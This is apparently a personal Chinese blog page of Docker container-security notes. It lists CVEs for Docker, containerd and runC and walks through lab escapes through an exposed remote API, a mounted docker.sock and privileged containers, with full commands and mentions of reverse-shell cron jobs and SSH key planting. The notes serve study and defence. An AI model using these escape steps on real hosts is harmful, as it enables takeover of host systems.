<!--
	作者：Sariay
	时间：2018-08-26
	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head>
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      容器安全 | Archeri&#39;s Blog
    
  </title>
  <meta name="author" content="Archeri Shade">
  <meta name="keywords" content="" />
  <meta name="description" content="" />
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  
<link rel="stylesheet" href="/css/Annie.css">

  
  <!-- jquery -->
	
<script src="/plugin/jquery/jquery.min.js"></script>


<script>
    const CONFIG_BGIMAGE = {
      mode: 'random_you',
      normalSrc: '/img/header-bg.jpg',
      randomYouMax: 7,
      randomYouSrc: '/img/Random-img/',
	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: false,
	  appId: 'AU8...',
	  appKey: '4cU...',
	  serverURLs: 'http' || ' '
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">获取中...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			「容器安全」
		
	</p>

	
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="https://github.com/ArcheriShade" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		
<script src="/plugin/toc/katelog.min.js"></script>


		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" itemprop="url">
		容器安全
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	更新于

	<a href="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" itemprop="url">
		<time datetime="2024-04-08T04:08:22.000Z" itemprop="dateUpdated">
	  		2024-04-08
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/Docker/" class=" ">
			Docker
		</a>
	
		<a href="/tags/%E5%AE%B9%E5%99%A8/" class=" ">
			容器
		</a>
	
		<a href="/tags/container/" class=" ">
			container
		</a>
	
		<a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" class=" ">
			云原生
		</a>
	
		<a href="/tags/%E5%AE%89%E5%85%A8/" class=" ">
			安全
		</a>
	
		
			</span>
			
			



		</div>

		<div class="article-content" id="article-content">
			<h1 id="一、Docker安全概述"><a href="#一、Docker安全概述" class="headerlink" title="一、Docker安全概述"></a>一、Docker安全概述</h1><p>Docker 自身是基于 Linux 的多种 Namespace 实现的，其中有一个很重要的 Namespace 叫作 User Namespace，User Namespace 主要是用来做容器内用户和主机的用户隔离的。在过去容器里的 root 用户就是主机上的 root 用户，如果容器受到攻击，或者容器本身含有恶意程序，在容器内就可以直接获取到主机 root 权限。Docker 从 1.10 版本开始，使用 User Namespace 做用户隔离，实现了容器中的 root 用户映射到主机上的非 root 用户，从而大大减轻了容器被突破的风险。</p>
<p>在生产环境中，建议每个容器都添加相应的资源限制。下面给出一些执行<code>docker run</code>命令启动容器时可以传递的资源限制参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--cpus                          限制 CPU 配额</span><br><span class="line">-m, --memory                    限制内存配额</span><br><span class="line">--pids-limit                    限制容器的 PID 个数</span><br></pre></td></tr></table></figure>

<p>例如我想要启动一个 1 核 2G 的容器，并且限制在容器内最多只能创建 1000 个 PID，启动命令如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it --cpus=1 -m=2048m --pids-limit=1000 busybox sh</span><br></pre></td></tr></table></figure>

<p>推荐在生产环境中限制 CPU、内存、PID 等资源，这样即便应用程序有漏洞，也不会导致主机的资源完全耗尽，最大限度降低安全风险。</p>
<p>安全容器：<a target="_blank" rel="noopener" href="https://github.com/kata-containers">Kata</a></p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/Ciqc1F9keVSAHuDTAADaB11MKbU710.png" alt="Lark20200918-170906.png"></p>
<p>历史漏洞（部分，已公开的）：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/security/non-events/">https://docs.docker.com/engine/security/non-events/</a></p>
<h1 id="十三、安全"><a href="#十三、安全" class="headerlink" title="十三、安全"></a>十三、安全</h1><p>弱隔离性：</p>
<ul>
<li><p>文件系统隔离</p>
<blockquote>
<p>Docker中隔离文件功能的实现是基于Mount命名空间的</p>
<p>如果容器具有root权限，执行<code>chmod a+s &#123;bin&#125;</code>，运行程序的用户获得主机的root权限</p>
</blockquote>
</li>
<li><p>进程和通信隔离</p>
<blockquote>
<p>Docker使用PID命名空间来隔离进程PID</p>
</blockquote>
</li>
<li><p>设备管理和主机资源约束</p>
<blockquote>
<p>Docker容器中域名和主机名的隔离是通过UTS命名空间实现的，使用cgroup限制资源</p>
</blockquote>
</li>
<li><p>网络隔离和镜像传输</p>
<blockquote>
<p>Docker中的NET命名空间负责隔离网络资源</p>
</blockquote>
</li>
</ul>
<h2 id="13-1-判断容器环境"><a href="#13-1-判断容器环境" class="headerlink" title="13.-1 判断容器环境"></a>13.-1 判断容器环境</h2><ul>
<li>检查根目录下是否有<code>.dockerenv</code>文件</li>
<li>检查进程表是否“过于简洁”：<code>ps -aux</code></li>
<li>查看1号进程是否为<code>init</code>、<code>systemd</code>等常见的系统初始化进程</li>
<li>终端下<code>echo $$</code>，看看是不是“1”</li>
<li>检查1号进程的cgroup信息是否有“docker”字眼：<code>cat /proc/1/cgroup</code>&#x3D;&#x3D;前提是使用的cgroup v1&#x3D;&#x3D;</li>
<li>查看环境变量是否有“docker”字眼：<code>env</code></li>
<li>查看已挂载的文件系统，是否有overlay、overlay2、aufs这种容器常用的联合挂载文件系统：<code>mount</code></li>
</ul>
<h2 id="13-0-漏洞整理"><a href="#13-0-漏洞整理" class="headerlink" title="13.0 漏洞整理"></a>13.0 漏洞整理</h2><p>范围：CVEdetails.com</p>
<ul>
<li>Docker: <a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-13534/product_id-28125/Docker-Docker.html">https://www.cvedetails.com/vulnerability-list/vendor_id-13534/product_id-28125/Docker-Docker.html</a></li>
<li>containerd: <a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-11448/product_id-81142/Linuxfoundation-Containerd.html">https://www.cvedetails.com/vulnerability-list/vendor_id-11448/product_id-81142/Linuxfoundation-Containerd.html</a></li>
<li>runC: <a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-11448/product_id-60655/Linuxfoundation-Runc.html">https://www.cvedetails.com/vulnerability-list/vendor_id-11448/product_id-60655/Linuxfoundation-Runc.html</a></li>
</ul>
<p>截至2024.03.28</p>
<h3 id="13-0-1-汇总"><a href="#13-0-1-汇总" class="headerlink" title="13.0.1 汇总"></a>13.0.1 汇总</h3><table>
<thead>
<tr>
<th>软件</th>
<th>CVE数</th>
<th>有关隔离性的CVE数</th>
</tr>
</thead>
<tbody><tr>
<td>Docker</td>
<td>37</td>
<td>15</td>
</tr>
<tr>
<td>containerd</td>
<td>11</td>
<td>8</td>
</tr>
<tr>
<td>runC</td>
<td>12</td>
<td>10</td>
</tr>
</tbody></table>
<p>详情：</p>
<ul>
<li><p><strong>Docker</strong></p>
<ul>
<li><p>CVE-2021-21284</p>
</li>
<li><p>CVE-2020-14300（只影响红帽Linux上特定版本的Docker）</p>
</li>
<li><p>CVE-2020-14298（只影响红帽Linux上特定版本的Docker）</p>
</li>
<li><p>CVE-2019-5736（runC逃逸）</p>
</li>
<li><p>CVE-2019-16884</p>
</li>
<li><p>CVE-2019-14271（Docker cp命令漏洞）</p>
</li>
<li><p>CVE-2018-15664（Docker cp命令漏洞，TOCTOU）</p>
</li>
<li><p>CVE-2018-10892</p>
</li>
<li><p>CVE-2016-9962</p>
</li>
<li><p>CVE-2016-8867</p>
</li>
<li><p>CVE-2016-3697</p>
</li>
<li><p>CVE-2015-3631</p>
</li>
<li><p>CVE-2015-3630</p>
</li>
<li><p>CVE-2015-3627</p>
</li>
<li><p>CVE-2014-9356</p>
</li>
</ul>
</li>
<li><p><strong>containerd</strong></p>
<ul>
<li><p>CVE-2023-25173</p>
</li>
<li><p>CVE-2022-31030</p>
</li>
<li><p>CVE-2022-23648</p>
</li>
<li><p>CVE-2022-23471</p>
</li>
<li><p>CVE-2021-43816</p>
</li>
<li><p>CVE-2021-41103</p>
</li>
<li><p>CVE-2021-21334</p>
</li>
<li><p>CVE-2020-15257</p>
</li>
</ul>
</li>
<li><p><strong>runC</strong></p>
<ul>
<li><p>CVE-2024-21626</p>
</li>
<li><p>CVE-2023-28642</p>
</li>
<li><p>CVE-2023-27561</p>
</li>
<li><p>CVE-2023-25809</p>
</li>
<li><p>CVE-2022-24769</p>
</li>
<li><p>CVE-2021-30465</p>
</li>
<li><p>CVE-2019-19921</p>
</li>
<li><p>CVE-2019-16884</p>
</li>
<li><p>CVE-2019-5736</p>
</li>
<li><p>CVE-2016-3697</p>
</li>
</ul>
</li>
</ul>
<h3 id="13-0-2-知名度相对较高的CVE"><a href="#13-0-2-知名度相对较高的CVE" class="headerlink" title="13.0.2 知名度相对较高的CVE"></a>13.0.2 知名度相对较高的CVE</h3><table>
<thead>
<tr>
<th>CVE编号</th>
<th>类型</th>
<th>影响版本</th>
<th>利用条件</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2016-3697</td>
<td>提权</td>
<td>runC &lt;&#x3D; 0.0.9<br />Docker &lt; 1.11.2</td>
<td></td>
</tr>
<tr>
<td>CVE-2016-8867</td>
<td>文件越权访问-runC</td>
<td>Docker &#x3D;&#x3D; 1.12.2</td>
<td></td>
</tr>
<tr>
<td>CVE-2016-9962</td>
<td>逃逸-runC</td>
<td>1.11.0 &lt;&#x3D; Docker &lt; 1.12.6</td>
<td></td>
</tr>
<tr>
<td>CVE-2018-10892</td>
<td>越权-操作宿主机硬件</td>
<td>1.11 &lt;&#x3D; Docker &lt;&#x3D; 18.03.1</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2018-15664</strong></td>
<td>任意文件读写-cp命令</td>
<td>Docker 17.06.0-ce～17.12.1-ce:rc2<br />Docker 18.01.0-ce～18.06.1-ce:rc2</td>
<td>TOCTOU</td>
</tr>
<tr>
<td><strong>CVE-2019-5736</strong></td>
<td>逃逸-runC</td>
<td>Docker &lt;&#x3D; 18.09.2<br />runC &lt;&#x3D; 1.0-rc6</td>
<td>攻击者具有容器文件上传权限&amp;&amp;<br />管理员使用exec访问容器||<br />攻击者具有启动容器权限</td>
</tr>
<tr>
<td><strong>CVE-2019-14271</strong></td>
<td>逃逸-cp命令</td>
<td>Docker &#x3D;&#x3D; 19.03.0 &amp;&amp; &lt; 19.03.1</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2019-16884</strong></td>
<td>绕过docker-default规则-runC</td>
<td>Docker &lt;&#x3D; 19.03.2<br />runC &lt;&#x3D; 1.0.0-rc8</td>
<td></td>
</tr>
<tr>
<td>CVE-2019-19921</td>
<td>提权-runC</td>
<td>runC &lt;&#x3D; 0.1.1</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2020-15257</strong></td>
<td>逃逸-containerd</td>
<td>containerd &lt; 1.4.3<br />containerd &lt; 1.3.9</td>
<td>使用hostnetwork网络模式启动容器&amp;&amp;<br />使用root用户(UID:0)启动容器</td>
</tr>
<tr>
<td>CVE-2021-21284</td>
<td>提权-宿主机文件遍历</td>
<td>Docker &lt; 19.03.15<br />20.0.0 &lt; Docker &lt; 20.10.3</td>
<td></td>
</tr>
<tr>
<td>CVE-2021-21334</td>
<td>越权-containerd</td>
<td>containerd &lt; 1.3.10<br />1.4.0 &lt;&#x3D; containerd &lt; 1.4.4</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2021-30465</strong></td>
<td>逃逸-runC竞争条件</td>
<td>runC &lt;&#x3D; 1.0.0-rc94</td>
<td>存在K8S这种容器编排工具<br />攻击者拥有恶意容器</td>
</tr>
<tr>
<td>CVE-2021-41103</td>
<td>越权-containerd</td>
<td>containerd &lt; 1.4.11<br />1.5.0 &lt;&#x3D; containerd &lt; 1.5.7</td>
<td></td>
</tr>
<tr>
<td>CVE-2021-43816</td>
<td>越权-containerd</td>
<td>1.5.1 &lt;&#x3D; containerd &lt; 1.5.9</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2022-0492</strong></td>
<td>逃逸-cgroup</td>
<td>kernel &lt; 5.17 rc3</td>
<td>容器以root身份运行<br />容器启用SYS_ADMIN<br />AppArmor与SELinux被禁用（或特定情况）<br />Seccomp被禁用（或特定情况）<br />cgroup v1</td>
</tr>
<tr>
<td>CVE-2022-23471</td>
<td>资源隔离失效-containerd</td>
<td>containerd &lt; 1.5.16<br />1.6.0 &lt;&#x3D; containerd &lt; 1.6.12</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2022-23648</strong></td>
<td>任意文件读取-containerd</td>
<td>containerd &lt;&#x3D; 1.4.12, 1.5.0 - 1.5.9, &#x3D;&#x3D; 1.6.0</td>
<td>k8s&#x2F;crictl + containerd<br />Docker + containerd不受影响</td>
</tr>
<tr>
<td>CVE-2022-24769</td>
<td>Cap提权-containerd</td>
<td>Docker &lt; 20.10.14<br />containerd &lt; 1.5.11, &lt; 1.6.2<br />runC &lt; 1.1.2</td>
<td></td>
</tr>
<tr>
<td>CVE-2022-31030</td>
<td>资源隔离失效-containerd</td>
<td>containerd &lt; 1.5.13<br />1.6.0 &lt;&#x3D; containerd &lt; 1.6.6</td>
<td></td>
</tr>
<tr>
<td>CVE-2023-25173</td>
<td>越权-containerd</td>
<td>containerd &lt; 1.5.18<br />1.6.0 &lt;&#x3D; containerd &lt; 1.6.18</td>
<td></td>
</tr>
<tr>
<td>CVE-2023-25809</td>
<td>越权-runC</td>
<td>runC &lt; 1.1.5</td>
<td></td>
</tr>
<tr>
<td>CVE-2023-27561</td>
<td>提权-runC</td>
<td>1.0.0-rc95 &lt;&#x3D; runC &lt; 1.1.5</td>
<td></td>
</tr>
<tr>
<td>CVE-2023-28642</td>
<td>越权-runC</td>
<td>runC &lt; 1.1.5</td>
<td></td>
</tr>
<tr>
<td><strong>CVE-2024-21626</strong></td>
<td>逃逸-runC</td>
<td>1.0.0-rc93 &lt;&#x3D; runC &lt;&#x3D; 1.1.11<br />|| (1.4.7 &lt;&#x3D; containerd &lt;&#x3D; 1.6.27 || &#x3D;&#x3D; 1.7.12)<br />|| Dcoker &lt; 25.0.2</td>
<td></td>
</tr>
</tbody></table>
<h3 id="13-0-3-论文用作测试或提及的CVE"><a href="#13-0-3-论文用作测试或提及的CVE" class="headerlink" title="13.0.3 论文用作测试或提及的CVE"></a>13.0.3 论文用作测试或提及的CVE</h3><p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240328105541634.png" alt="image-20240328105541634"></p>
<ul>
<li>CVE-2016-0728：内核提权漏洞</li>
<li>CVE-2016-5195：DirtyCow</li>
<li>CVE-2017-5123：内核漏洞，提权</li>
<li>CVE-2017-7533：安卓的内核漏洞？</li>
<li>CVE-2018-18281：内核漏洞，竞争条件</li>
<li>CVE-2019-11487：内核漏洞，UAF</li>
</ul>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240328161407079.png" alt="image-20240328161407079"></p>
<p>Docker&#x2F;runC&#x2F;containerd的都收录在13.0.2节的表格</p>
<h2 id="13-1-配置不当引起的逃逸"><a href="#13-1-配置不当引起的逃逸" class="headerlink" title="13.1 配置不当引起的逃逸"></a>13.1 配置不当引起的逃逸</h2><p>Docker默认的AppArmor配置禁止容器执行<code>mount</code>系统调用</p>
<h3 id="13-1-1-Docker-remote-api未授权访问"><a href="#13-1-1-Docker-remote-api未授权访问" class="headerlink" title="13.1.1 Docker remote api未授权访问"></a>13.1.1 Docker remote api未授权访问</h3><p>环境：</p>
<ul>
<li>Ubuntu: 22.04</li>
<li>kernel: 6.5.0-21-generic</li>
<li>Docker: 25.0.3</li>
<li>containerd: 1.6.28</li>
<li>runC: 1.1.12</li>
<li>docker-init: 0.19.0</li>
</ul>
<p>Docker remote api可以执行docker命令，可直接调用API来操作Docker</p>
<p>这个版本的Docker，默认是没有开启远程管API功能的，需要手动开启一下</p>
<p>使用<code>docker swarm</code>这种单机容器编排工具时，会默认绑定到0.0.0.0:2375</p>
<p><strong>方法一：修改docker.service配置</strong>&#x3D;&#x3D;会导致Docker服务重启，仅本地测试使用，不要在生产环境使用&#x3D;&#x3D;</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看docker的systemd配置文件位置，得到/lib/systemd/system/docker.service</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl status docker</span><br><span class="line"><span class="comment"># 编辑systemd配置文件，加入启动项</span></span><br><span class="line"><span class="built_in">sudo</span> nano /lib/systemd/system/docker.service</span><br></pre></td></tr></table></figure>

<p>配置文件添加：</p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240408103124899.png" alt="image-20240408103124899"></p>
<p>重新启动dockerd：<code>sudo systemctl restart docker.service</code></p>
<p>测试接口：<code>curl http://127.0.0.1:2375/containers/json</code>（没有容器运行的话，只会返回“[]”）</p>
<p><strong>方法二：启用live-restore配置</strong>&#x3D;&#x3D;没能成功，以后看看&#x3D;&#x3D;</p>
<hr>
<p>能够远程访问Docker API之后，就可以把宿主机文件系统挂载到容器内部：</p>
<p><code>sudo docker -H tcp://127.0.0.1:2375 run -it --rm -v /:/mnt ubuntu /bin/bash</code></p>
<p>之后可以：</p>
<ul>
<li>写入反弹shell到定时任务</li>
<li>写入root的ssh密钥</li>
<li>等</li>
</ul>
<blockquote>
<p>启用远程API访问的时候，执行<code>docker info</code>最后会回显：</p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240408145634117.png" alt="image-20240408145634117"></p>
</blockquote>
<blockquote>
<p>这种使用REST API自Docker 0.5.2之后就被默认关掉了，取而代之的是一个UNIX socket —— <code>docker.sock</code>（默认位置是“&#x2F;var&#x2F;run&#x2F;docker.sock”）来用于客户端和dockerd之间的通信，可以在上面使用传统的UNIX权限检查来执行访问控制</p>
</blockquote>
<p>&#x3D;&#x3D;这是一种关于dockerd的攻击面&#x3D;&#x3D;</p>
<h3 id="13-1-2-docker-sock挂载到容器内部"><a href="#13-1-2-docker-sock挂载到容器内部" class="headerlink" title="13.1.2 docker.sock挂载到容器内部"></a>13.1.2 docker.sock挂载到容器内部</h3><p>根据上一节所述，其实就是把宿主机上的&#x2F;var&#x2F;run&#x2F;docker.sock挂载到了恶意容器内部，然后在容器内也通过这个套接字对dockerd进行操作，从而影响宿主机，因此得出利用条件：</p>
<ul>
<li>攻击者掌控恶意容器</li>
<li>恶意容器内存在宿主机上的docker.sock</li>
<li>恶意容器内存在可用的Docker客户端（挂载宿主机的，或者apt再装一个）</li>
</ul>
<p>&#x3D;&#x3D;感觉很离谱&#x3D;&#x3D;</p>
<p>在容器内寻找有没有<code>docker.sock</code>：<code>find / -name docker.sock</code></p>
<p><code>sudo docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock -v /usr/bin/docker:/usr/bin/docker ubuntu /bin/bash</code></p>
<p>之后就可以通过创建新的容器，把宿主机文件系统挂载到新容器中，从而操作宿主机：</p>
<p><code>docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash</code></p>
<blockquote>
<p>也可以直接通过挂载进恶意容器的<code>docker</code>程序，进行操作：<code>docker run -it -v /:/test ubuntu /bin/bash</code></p>
<p>主角是<code>docker.sock</code>文件，不能只挂载<code>docker</code>程序而不挂载<code>docker.sock</code>文件</p>
</blockquote>
<p>&#x3D;&#x3D;有个关于fd:&#x2F;&#x2F;的<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/43303507/what-does-fd-mean-exactly-in-dockerd-h-fd">解释</a>&#x3D;&#x3D;</p>
<h3 id="13-1-3-配置–privileged启动容器"><a href="#13-1-3-配置–privileged启动容器" class="headerlink" title="13.1.3 配置–privileged启动容器"></a>13.1.3 配置–privileged启动容器</h3><p>环境：</p>
<ul>
<li>Ubuntu: 22.04</li>
<li>kernel: 6.5.0-21-generic</li>
<li>Docker: 25.0.3</li>
<li>containerd: 1.6.28</li>
<li>runC: 1.1.12</li>
<li>docker-init: 0.19.0</li>
</ul>
<p>特权容器：<code>sudo docker run -it --rm --privileged --name pri_test ubuntu /bin/bash</code></p>
<p>非特权容器：<code>sudo docker run -it --rm --name test ubuntu /bin/bash</code></p>
<p>容器内查看capabilities：<code>cat /proc/1/status | grep Cap</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面是特权容器的capabilities</span></span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	000001ffffffffff</span><br><span class="line">CapEff:	000001ffffffffff</span><br><span class="line">CapBnd:	000001ffffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面是非特权容器的capabilities</span></span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	00000000a80425fb</span><br><span class="line">CapEff:	00000000a80425fb</span><br><span class="line">CapBnd:	00000000a80425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>



<p>接下来可以干的事情：</p>
<ul>
<li>挂载rootfs</li>
<li>写入定时任务</li>
<li>Mknod</li>
</ul>
<p><strong>挂载<code>rootfs</code>逃逸</strong></p>
<p>容器内执行<code>fdisk -l</code></p>
<blockquote>
<p>这里无论是特权还是非特权容器都会显示”bash: fdisk: command not found”</p>
<p>而且容器内在&#x2F;usr&#x2F;sbin下也找不到fdisk这个程序</p>
</blockquote>
<p>但是可以执行<code>df -h</code>查看挂载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 特权容器</span><br><span class="line">root@1802ca58c055:/# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">overlay          98G   15G   78G  16% /</span><br><span class="line">tmpfs            64M     0   64M   0% /dev</span><br><span class="line">shm              64M     0   64M   0% /dev/shm</span><br><span class="line">/dev/vda3        98G   15G   78G  16% /etc/hosts</span><br><span class="line"></span><br><span class="line"># 非特权容器</span><br><span class="line">root@5fe15288c47b:/# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">overlay          98G   15G   78G  16% /</span><br><span class="line">tmpfs            64M     0   64M   0% /dev</span><br><span class="line">shm              64M     0   64M   0% /dev/shm</span><br><span class="line">/dev/vda3        98G   15G   78G  16% /etc/hosts</span><br><span class="line">tmpfs           7.9G     0  7.9G   0% /proc/asound</span><br><span class="line">tmpfs           7.9G     0  7.9G   0% /proc/acpi</span><br><span class="line">tmpfs           7.9G     0  7.9G   0% /proc/scsi</span><br><span class="line">tmpfs           7.9G     0  7.9G   0% /sys/firmware</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;就当隐约猜出&#x2F;dev&#x2F;vda3是宿主机磁盘了吧&#x3D;&#x3D;</p>
<p>依次执行：</p>
<ol>
<li><code>mkdir test</code></li>
<li><code>mount /dev/vda3 /test</code></li>
</ol>
<p>非特权容器执行结果：“mount: &#x2F;test: permission denied.”</p>
<p>特权容器执行结果：把宿主机的文件系统挂载到了&#x2F;test下，创建的文件是root权限</p>
<p>&#x3D;&#x3D;特权容器给予访问宿主机所有设备的权限，可能还有seccomp、Apprmor等策略限制解除什么的&#x3D;&#x3D;</p>
<p><strong><code>mknod</code>创建特殊文件逃逸</strong></p>
<blockquote>
<p>倘若知道宿主机在操作系统中的<strong>主次设备号</strong>，则可以尝试使用该命令<strong>创建指向宿主机的一个block文件</strong>，而后利用<code>debugfs</code>命令访问该文件，从而达到操控宿主机文件的效果</p>
</blockquote>
<blockquote>
<p>在Docker容器中，<code>/etc/hostname</code>、<code>/etc/resolv.conf</code>、<code>/etc/hosts</code>通常是从宿主机中挂载而来，我们可以通过查看容器的挂载信息来获知宿主机的主次设备号</p>
</blockquote>
<p>容器内查看宿主机主次设备号：<code>cat /proc/1/mountinfo | grep /etc/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 特权/非特权容器的执行结果都是一样的</span><br><span class="line">2379 2371 253:3 /var/lib/docker/containers/5c68134839560394e2b33769c78c6624706a28d267d552e338d0130f16fbeb05/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/vda3 rw,errors=remount-ro</span><br><span class="line">2380 2371 253:3 /var/lib/docker/containers/5c68134839560394e2b33769c78c6624706a28d267d552e338d0130f16fbeb05/hostname /etc/hostname rw,relatime - ext4 /dev/vda3 rw,errors=remount-ro</span><br><span class="line">2381 2371 253:3 /var/lib/docker/containers/5c68134839560394e2b33769c78c6624706a28d267d552e338d0130f16fbeb05/hosts /etc/hosts rw,relatime - ext4 /dev/vda3 rw,errors=remount-ro</span><br></pre></td></tr></table></figure>

<p>上面的“253:3”就是主次设备号</p>
<p>创建&#x2F;dev&#x2F;vda3的block设备文件：<code>mknod newnod b 253 3</code>（特权&#x2F;非特权容器都可以执行成功）</p>
<p>最后使用<code>debugfs</code>操作设备：<code>debugfs -w newnod</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 特权容器操作成功</span><br><span class="line"></span><br><span class="line"># 非特权容器显示：</span><br><span class="line">root@5c6813483956:/# debugfs -w newnod</span><br><span class="line">debugfs 1.46.5 (30-Dec-2021)</span><br><span class="line">debugfs: Operation not permitted while trying to open newnod</span><br></pre></td></tr></table></figure>

<p>之后特权容器可以对宿主机文件系统任意读写</p>
<blockquote>
